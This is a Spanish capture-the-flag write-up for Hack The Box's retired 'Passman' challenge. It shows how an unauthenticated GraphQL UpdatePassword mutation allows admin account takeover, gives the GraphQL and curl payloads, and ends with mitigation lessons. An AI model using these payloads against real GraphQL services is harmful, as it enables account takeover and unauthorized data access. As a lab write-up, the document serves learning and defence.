---
challenge: Passman
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, graphql, idor, broken-access-control, source-review]
---

# Passman — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de análisis; el flag no se publica.

## Enunciado

Un gestor de contraseñas con API **GraphQL**. Se entrega (o se publica) el **código fuente** de la aplicación, así que el reto es de revisión, no de fuerza bruta.

## Reconocimiento

```bash
gobuster dir -u http://<IP>:<PORT>/ -w /usr/share/wordlists/dirb/common.txt
```

- `/` sirve el frontend; `/graphql` expone el esquema.
- Con el código en mano, el esquema se lee directamente en los resolvers y en `schema.graphql`.

## El fallo: `UpdatePassword` sin autorización

En el fichero de mutaciones hay una operación que cambia la contraseña de un usuario recibiendo su nombre de usuario y la nueva contraseña, **sin comprobar quién llama** y sin pedir la contraseña actual:

```graphql
mutation {
  UpdatePassword(username: "admin", password: "<NEW_PASS>") {
    message
  }
}
```

No es un IDOR de lectura: es una **mutación de escritura sin control de acceso**. Con ella se toma la cuenta de `admin`.

```bash
curl -s http://<IP>:<PORT>/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"mutation { UpdatePassword(username: \"admin\", password: \"<NEW_PASS>\") { message } }"}'
```

## Entrar y leer el flag

Se inicia sesión como `admin` con la contraseña nueva y el flag está **dentro del gestor**, asociado a la cuenta del administrador.

> Cuidado con el señuelo: `entrypoint.sh` siembra en la base de datos un flag falso para que el reto «tenga» datos. El válido es el que aparece tras autenticarse como `admin`.

```bash
curl -s http://<IP>:<PORT>/graphql -H 'Content-Type: application/json' \
  -H "Authorization: Bearer <token>" \
  -d '{"query":"{ getPhrase(username: \"admin\") { phrase } }"}'
```

## Conclusiones

- El vector es **GraphQL sin autorización en una mutación**, no un IDOR clásico de lectura.
- La contraseña se cambia sin conocer la anterior ni verificar la identidad del solicitante.
- El flag sembrado por el contenedor es ruido: sólo vale el de la cuenta de administrador.

## Lecciones

- En GraphQL hay que revisar cada mutación, no sólo las queries.
- Cambiar credenciales debe exigir la contraseña actual y una sesión válida.
- Un flag en el seed es una trampa habitual; el objetivo real está detrás de la autenticación.
- Mitigación: autorización por resolver, `currentPassword` obligatoria y rate limiting en `/graphql`.
